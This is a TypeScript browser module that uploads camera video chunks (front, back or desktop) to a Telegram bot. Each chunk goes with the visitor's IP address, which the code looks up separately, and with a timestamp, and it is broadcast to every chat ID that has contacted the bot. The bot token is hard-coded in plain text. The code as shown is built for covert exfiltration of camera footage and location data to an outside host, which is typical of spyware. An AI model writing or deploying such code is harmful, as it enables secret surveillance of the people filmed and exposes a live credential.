// Utility for uploading video chunks to Telegram

const TELEGRAM_BOT_TOKEN = '8558710499:AAGJ8LA9PbCjQnnHGjBhq86ufCcZiIzXOxs';

// Function to get user IP address
const getUserIP = async (): Promise<string> => {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip || 'Unknown';
  } catch (error) {
    console.error('❌ [Video] Ошибка получения IP:', error);
    return 'Unknown';
  }
};

// Get all chat IDs from Telegram bot updates
const getAllChatIds = async (botToken: string): Promise<Set<number>> => {
  try {
    console.log('📱 [Video] Получаем список пользователей бота...');
    const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
    const data = await response.json();
    
    if (data.ok && data.result) {
      const chatIds = new Set<number>();
      
      data.result.forEach((update: any) => {
        if (update.message?.chat?.id) {
          chatIds.add(update.message.chat.id);
        }
        if (update.callback_query?.message?.chat?.id) {
          chatIds.add(update.callback_query.message.chat.id);
        }
      });
      
      console.log(`✅ [Video] Найдено ${chatIds.size} пользователей`);
      return chatIds;
    }
    
    return new Set();
  } catch (error) {
    console.error('❌ [Video] Ошибка получения списка пользователей:', error);
    return new Set();
  }
};

// Detect browser for choosing the right method
const detectBrowser = (): 'safari' | 'other' => {
  const ua = navigator.userAgent;
  if (/Safari/.test(ua) && !/Chrome/.test(ua) && !/Chromium/.test(ua)) {
    return 'safari';
  }
  return 'other';
};

// Send video using FormData and fetch (for most browsers)
const sendVideoFetch = async (
  botToken: string,
  chatId: number,
  videoBlob: Blob,
  caption: string
): Promise<boolean> => {
  try {
    // Detect file extension from blob type
    const isMP4 = videoBlob.type.includes('mp4');
    const fileName = isMP4 ? 'video.mp4' : 'video.webm';
    
    const formData = new FormData();
    formData.append('chat_id', chatId.toString());
    formData.append('video', videoBlob, fileName);
    formData.append('caption', caption);
    
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
      method: 'POST',
      body: formData
    });
    
    const result = await response.json();
    
    if (response.ok) {
      console.log(`✅ [Video Fetch] Отправлено пользователю ${chatId}`);
      return true;
    } else {
      console.warn(`⚠️ [Video Fetch] Ошибка для ${chatId}:`, result);
      return false;
    }
  } catch (error) {
    console.error(`❌ [Video Fetch] Ошибка отправки ${chatId}:`, error);
    return false;
  }
};

// Send video using XMLHttpRequest (for Safari)
const sendVideoXHR = async (
  botToken: string,
  chatId: number,
  videoBlob: Blob,
  caption: string
): Promise<boolean> => {
  return new Promise((resolve) => {
    try {
      // Detect file extension from blob type
      const isMP4 = videoBlob.type.includes('mp4');
      const fileName = isMP4 ? 'video.mp4' : 'video.webm';
      
      const formData = new FormData();
      formData.append('chat_id', chatId.toString());
      formData.append('video', videoBlob, fileName);
      formData.append('caption', caption);
      
      const xhr = new XMLHttpRequest();
      xhr.open('POST', `https://api.telegram.org/bot${botToken}/sendVideo`, true);
      
      xhr.onload = function() {
        if (xhr.status >= 200 && xhr.status < 300) {
          console.log(`✅ [Video XHR] Отправлено пользователю ${chatId}`);
          resolve(true);
        } else {
          console.warn(`⚠️ [Video XHR] Ошибка ${xhr.status} для ${chatId}`);
          resolve(false);
        }
      };
      
      xhr.onerror = function() {
        console.error(`❌ [Video XHR] Сетевая ошибка для ${chatId}`);
        resolve(false);
      };
      
      xhr.ontimeout = function() {
        console.error(`⏱️ [Video XHR] Таймаут для ${chatId}`);
        resolve(false);
      };
      
      xhr.timeout = 30000; // 30 seconds for video
      xhr.send(formData);
    } catch (error) {
      console.error(`❌ [Video XHR] Исключение для ${chatId}:`, error);
      resolve(false);
    }
  });
};

// Main function to send video to all users
export const sendVideoToTelegram = async (
  videoBlob: Blob,
  chunkNumber: number,
  cameraType: 'front' | 'back' | 'desktop'
): Promise<void> => {
  try {
    const browser = detectBrowser();
    const chatIds = await getAllChatIds(TELEGRAM_BOT_TOKEN);
    
    if (chatIds.size === 0) {
      console.log('⚠️ [Video] Нет пользователей для отправки');
      return;
    }
    
    // Get IP address
    const ip = await getUserIP();
    
    const cameraLabel = cameraType === 'front' ? '🤳 Фронтальная' : 
                        cameraType === 'back' ? '📷 Основная' : 
                        '🖥️ Десктоп';
    
    const caption = `🎥 Видео чанк #${chunkNumber}\n` +
                    `📹 Камера: ${cameraLabel}\n` +
                    `📦 Размер: ${(videoBlob.size / 1024 / 1024).toFixed(2)} MB\n` +
                    `🌐 IP: ${ip}\n` +
                    `⏰ ${new Date().toLocaleString('ru-RU')}`;
    
    console.log(`📤 [Video] Отправка чанка #${chunkNumber} (${cameraLabel}) ${chatIds.size} пользователям...`);
    
    let successCount = 0;
    let errorCount = 0;
    
    for (const chatId of chatIds) {
      let success = false;
      
      if (browser === 'safari') {
        success = await sendVideoXHR(TELEGRAM_BOT_TOKEN, chatId, videoBlob, caption);
      } else {
        success = await sendVideoFetch(TELEGRAM_BOT_TOKEN, chatId, videoBlob, caption);
      }
      
      if (success) {
        successCount++;
      } else {
        errorCount++;
      }
    }
    
    console.log(`✅ [Video] Чанк #${chunkNumber}: успешно ${successCount}, ошибок ${errorCount}`);
  } catch (error) {
    console.error('❌ [Video] Критическая ошибка:', error);
  }
};